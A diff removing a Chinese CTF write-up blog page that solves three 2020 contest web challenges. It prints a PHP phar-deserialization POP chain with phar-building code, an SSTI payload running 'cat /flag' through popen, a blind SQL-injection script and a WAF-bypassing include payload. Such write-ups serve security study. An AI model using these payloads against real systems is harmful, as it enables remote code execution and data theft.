@@ -1,654 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar
-Paper：https://paper.seebug.org/680/
-题目一开始有www.zip给了源代码，下载过来审计;
-大概是有三个功能：文件上传、文件读取、SQL查询（登录框）
-phar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。
-class.php
-&amp;lt;?phperror_reporting(0);session_start();class User{public $id;public $age=null;public $nickname=null;public $backup;public function login() {if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){$mysqli=new dbCtrl();$this-&amp;gt;id=$mysqli-&amp;gt;login();if($this-&amp;gt;id){$_SESSION[&#39;id&#39;]=$this-&amp;gt;id;$_SESSION[&#39;login&#39;]=1;echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;}}}public function upload(){$uploader=new Upload();$uploader-&amp;gt;upload();}public function read(){$reader=new reader();$reader-&amp;gt;read($_POST[&#39;filename&#39;]);}public function __toString(){$this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;$user = new User();$user-&amp;gt;id = $_SESSION[&#39;id&#39;];$user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];return serialize($user);}}class dbCtrl{public $hostname=&amp;quot;127.'><title>2020“巅峰极客”</title>
-
-<link rel='canonical' href='https://anthem-whisper.github.io/tmp/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='2020“巅峰极客”'>
-<meta property='og:description' content='babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar
-Paper：https://paper.seebug.org/680/
-题目一开始有www.zip给了源代码，下载过来审计;
-大概是有三个功能：文件上传、文件读取、SQL查询（登录框）
-phar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。
-class.php
-&amp;lt;?phperror_reporting(0);session_start();class User{public $id;public $age=null;public $nickname=null;public $backup;public function login() {if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){$mysqli=new dbCtrl();$this-&amp;gt;id=$mysqli-&amp;gt;login();if($this-&amp;gt;id){$_SESSION[&#39;id&#39;]=$this-&amp;gt;id;$_SESSION[&#39;login&#39;]=1;echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;}}}public function upload(){$uploader=new Upload();$uploader-&amp;gt;upload();}public function read(){$reader=new reader();$reader-&amp;gt;read($_POST[&#39;filename&#39;]);}public function __toString(){$this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;$user = new User();$user-&amp;gt;id = $_SESSION[&#39;id&#39;];$user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];return serialize($user);}}class dbCtrl{public $hostname=&amp;quot;127.'>
-<meta property='og:url' content='https://anthem-whisper.github.io/tmp/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Tmp' />
-<meta name="twitter:title" content="2020“巅峰极客”">
-<meta name="twitter:description" content="babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar
-Paper：https://paper.seebug.org/680/
-题目一开始有www.zip给了源代码，下载过来审计;
-大概是有三个功能：文件上传、文件读取、SQL查询（登录框）
-phar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。
-class.php
-&amp;lt;?phperror_reporting(0);session_start();class User{public $id;public $age=null;public $nickname=null;public $backup;public function login() {if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){$mysqli=new dbCtrl();$this-&amp;gt;id=$mysqli-&amp;gt;login();if($this-&amp;gt;id){$_SESSION[&#39;id&#39;]=$this-&amp;gt;id;$_SESSION[&#39;login&#39;]=1;echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;}}}public function upload(){$uploader=new Upload();$uploader-&amp;gt;upload();}public function read(){$reader=new reader();$reader-&amp;gt;read($_POST[&#39;filename&#39;]);}public function __toString(){$this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;$user = new User();$user-&amp;gt;id = $_SESSION[&#39;id&#39;];$user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];return serialize($user);}}class dbCtrl{public $hostname=&amp;quot;127.">
-    </head>
-    <body class="article-page keep-sidebar">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended ">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全和代码审计</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>暗色模式</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/tmp/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">2020“巅峰极客”</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <h3 id="babyphp2">babyphp2</h3>
-<p>考点：phar反序列化、pop链、<code>compress.zlib://phar://</code>绕过<code>^phar</code></p>
-<p>Paper：https://paper.seebug.org/680/</p>
-<p>题目一开始有<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2_easyphp2.zip"  target="_blank" rel="noopener"
-    >www.zip</a>给了源代码，下载过来审计;</p>
-<p>大概是有三个功能：文件上传、文件读取、SQL查询（登录框）</p>
-<h4 id="phar反序列化">phar反序列化</h4>
-<p>我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。</p>
-<p>class.php</p>
-<pre><code>&lt;?php
-error_reporting(0);
-session_start();
-class User
-{
-    public $id;
-    public $age=null;
-    public $nickname=null;
-    public $backup;
-    public function login() {
-        if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){
-        $mysqli=new dbCtrl();
-        $this-&gt;id=$mysqli-&gt;login();
-        if($this-&gt;id){
-        $_SESSION['id']=$this-&gt;id;
-        $_SESSION['login']=1;
-        echo &quot;你的ID是&quot;.$_SESSION['id'];
-        echo &quot;你好！&quot;.$_SESSION['token'];
-        echo &quot;&lt;script&gt;window.location.href='upload.php'&lt;/script&gt;&quot;;
-        }
-    }
-}
-    public function upload(){
-        $uploader=new Upload();
-        $uploader-&gt;upload();
-    }
-    public function read(){
-        $reader=new reader();
-        $reader-&gt;read($_POST['filename']);
-    }
-    public function __toString()
-    {
-        $this-&gt;nickname-&gt;backup=$this-&gt;backup;
-        $user = new User();
-        $user-&gt;id = $_SESSION['id'];
-        $user-&gt;nickname = $_SESSION['token'];
-        return serialize($user);
-    }
-}
-class dbCtrl
-{
-    public $hostname=&quot;127.0.0.1&quot;;
-    public $dbuser=&quot;p3rh4ps&quot;;
-    public $dbpass=&quot;p3rh4ps&quot;;
-    public $database=&quot;p3rh4ps&quot;;
-    public $name;
-    public $password;
-    public $mysqli;
-    public $token;
-    public function __construct()
-    {
-        $this-&gt;name=$_POST['username'];
-        $this-&gt;password=$_POST['password'];
-    }
-    public function login()
-    {
-        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
-        if ($this-&gt;mysqli-&gt;connect_error) {
-            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);
-        }
-        $sql=&quot;select id,password from users where username=?&quot;;
-        $result=$this-&gt;mysqli-&gt;prepare($sql);
-        $result-&gt;bind_param('s', $this-&gt;name);
-        $result-&gt;execute();
-        $result-&gt;bind_result($idResult, $passwordResult);
-        $result-&gt;fetch();
-        $result-&gt;close();
-        if ($this-&gt;token=='admin') {
-            return $idResult;
-        }
-        if (!$idResult) {
-            echo('用户不存在!');
-            return false;
-        }
-        if (md5($this-&gt;password)!==$passwordResult) {
-            echo('密码错误！');
-            return false;
-        }
-        $_SESSION['token']=$this-&gt;name;
-        return $idResult;
-    }
-    public function __destruct(){
-        echo $this-&gt;token;
-    }
-}
-Class Upload{
-    public $flag;
-    public $file;
-    public $ext;
-    function __construct(){
-        $this-&gt;flag = 1;
-        $this-&gt;black_list = ['ph', 'ht', 'sh', 'pe', 'j', '=', 'co', '\\', '&quot;', '\''];
-    }
-    function check(){
-        $ext = substr($_FILES['file']['name'], strpos($_FILES['file']['name'], '.'));
-        $reg=implode(&quot;|&quot;,$this-&gt;black_list);
-        $reg = &quot;/&quot; . $reg . &quot;\x|\s|[\x01-\x20]/i&quot;;
-        if(preg_match($reg, $ext)){
-            $this-&gt;flag = 0;
-        }
-        $this-&gt;ext = $ext;
-    }
- 
-    function __wakeup(){
-        $this-&gt;flag = 1;
-    }
- 
-    function upload(){
-        $this-&gt;file = $_FILES['file'];
-        $this-&gt;check();
-        if($this-&gt;flag){
-            if(isset($_FILES['file'])){
-                if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
-                    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;];
-                }
-                else{
-                    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){
-                        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
-                    }
-                    else{
-                        if ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 10240){
-                            echo &quot;too big&quot;;
-                        }
-                        else{
-                            $new_addr = $_SERVER['DOCUMENT_ROOT'] . &quot;/upload/&quot; . md5($_FILES['file']['name']) . $this-&gt;ext;
-                            echo $new_addr;
-                            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $new_addr);
-                            return $new_addr;
-                        }
-                    }
-                }
-            }
-        }
-        else{
-            die(&quot;Noooooooooooooooooooooooooooo!&quot;);
-        }
-    }
-}
- 
-Class Reader{
-    public $filename;
-    public $result;
-    public function read($filename){
-        if (preg_match(&quot;/flag/i&quot;,$filename)){
-            die(&quot;想多了嗷&quot;);
-        }
-        if (preg_match(&quot;/sh/i&quot;,$filename)){
-            die(&quot;nooooooooooo!&quot;);
-        }
-        if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename)){
-            die(&quot;Invid Schema!&quot;);
-        }
-        echo file_get_contents($filename);
-    }
-    public function __set($name,$val){
-        echo file_get_contents($val);
-    }
-}
-</code></pre><p>众所周知，要触发phar反序列化，必须有文件操作函数，常见的大概是以下这些：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116013601.png" alt="img"  /></p>
-<p>在class.php里面，能触发的地方有两处：</p>
-<ol>
-<li>第117行file_exists</li>
-<li>第153和156行的file_get_contents</li>
-</ol>
-<p>我们起先看到的是第117行的file_exists，我们在这里尝试了一番之后发现这里并不能触发phar反序列化。</p>
-<p>原因是<code>file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])</code>进行了拼接，phar://是传不进去的，那么剩下的唯一能触发的地方只有第153和156行的<code>file_get_contents</code>了。</p>
-<p>而实际上能触发的只有153行的<code>file_get_contents</code>，156行的是给你读flag的。</p>
-<h4 id="构造pop链">构造pop链</h4>
-<p>全局搜索魔术方法；</p>
-<p>155行Reader::__set</p>
-<pre><code>public function __set($name,$val){
-    echo file_get_contents($val);
-}
-</code></pre><p>31行User::__toString</p>
-<pre><code>public function __toString()
-{
-    $this-&gt;nickname-&gt;backup=$this-&gt;backup;
-    $user = new User();
-    $user-&gt;id = $_SESSION['id'];
-    $user-&gt;nickname = $_SESSION['token'];
-    return serialize($user);
-}
- 
-</code></pre><p>81行dbCtrl::__destruct</p>
-<pre><code>public function __destruct(){
-    echo $this-&gt;token;
-}
-</code></pre><p>pop链很明确：</p>
-<pre><code>//pop链
-$pop = new dbCtrl();
-$pop-&gt;token = new User();
-$pop-&gt;token-&gt;nickname = new Reader();
-$pop-&gt;token-&gt;backup = '/flag';
- 
-//构造phar文件
-@unlink(&quot;phar.phar&quot;);
-$phar = new Phar(&quot;phar.phar&quot;);
-$phar-&gt;startBuffering();
-$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
-$phar-&gt;setMetadata($pop);
-$phar-&gt;addFromString(&quot;test.jpg&quot;, &quot;test&quot;);
-$phar-&gt;stopBuffering();
-</code></pre><p>运行得到一个phar.phar，改后缀（ph被waf了），上传。</p>
-<p>在read.php里面传入<code>compress.zlib://phar:///var/www/html/upload/xxx</code>获得flag</p>
-<h3 id="babyflask">babyflask</h3>
-<p>考点：常规SSTI和沙盒逃逸</p>
-<p>题目挺友好的，没有任何过滤，随便找个payload就可以打出来；</p>
-<pre><code>?name={{().__class__.__bases__.__getitem__(0).__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
-</code></pre><h3 id="babyback">babyback</h3>
-<p>考点：sqli单引号逃逸、bool盲注、</p>
-<p>进去一个登录框；</p>
-<p>fuzz一波之后发现ban掉了单双引号，自然想到了\造成的单引号逃逸。</p>
-<h4 id="sqli盲注">sqli盲注</h4>
-<pre><code>username=\&amp;password=||1#
-//提示密码错误，正常的应该是用户名或密码错误
-</code></pre><p>然后还发现ban了select，我拼命地想去绕，卡了很久，结果根本不用注表名列名，只需要得到管理员密码就行了（在robots.txt也有提示）</p>
-<pre><code>username=\&amp;password=||ascii(substr(password,1,1))&gt;1#
-</code></pre><p>这里是盲注的exp：</p>
-<pre><code>#python3
-#wh1sper
-import requests
-host = 'http://eci-2zebr3la2yjigbu8w27y.cloudeci1.ichunqiu.com/index.php'
-def mid(bot, top):
-    return (int)(0.5 * (top + bot))
-def sqli():
-    name = ''
-    for j in range(1, 250):
-        top = 126
-        bot = 32
-        while 1:
-            #babyselect = 'database()'#--p3rh4ps
-            babyselect = 'password'#--uAreRigHt
-            data = {
-                &quot;username&quot;: &quot;\\&quot;,
-                &quot;password&quot;: &quot;||ascii(substr({},{},1))&gt;{}#&quot;.format(babyselect, j, mid(bot, top))
-            }
-            r = requests.post(url=host, data=data)
-            #print(r.text)
-            #print(data)
-            if '&gt;密码错误&lt;' in r.text:
-                if top - 1 == bot:
-                    name += chr(top)
-                    print(name)
-                    break
-                bot = mid(bot, top)
-            else:
-                if top - 1 == bot:
-                    name += chr(bot)
-                    print(name)
-                    break
-                top = mid(bot, top)
-if __name__ == '__main__':
-    sqli()
-</code></pre><p>登录，来到第二关；</p>
-<p>是一个eval函数，</p>
-<pre><code>eval($command.&quot;=false&quot;);
-</code></pre><p>waf很强，可以用取反直接include根目录的flag：</p>
-<pre><code>command=?&gt;&lt;?=include~%D0%99%93%9E%98?&gt;
-</code></pre>
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-     
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2019 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
